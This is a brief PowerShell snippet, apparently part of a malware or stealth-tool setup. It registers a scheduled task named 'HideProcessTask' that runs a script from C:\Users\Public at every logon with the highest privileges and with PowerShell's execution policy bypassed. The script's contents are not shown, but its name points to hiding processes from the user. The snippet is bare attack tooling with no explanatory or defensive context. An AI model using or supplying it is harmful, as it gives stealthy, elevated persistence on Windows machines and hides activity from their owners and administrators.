$TaskName = "HideProcessTask"
$PSPath = "C:\Users\Public\hide_process.ps1"

# Create the task
schtasks /create /tn $TaskName /tr "powershell.exe -ExecutionPolicy Bypass -File $PSPath" /sc onlogon /rl highest
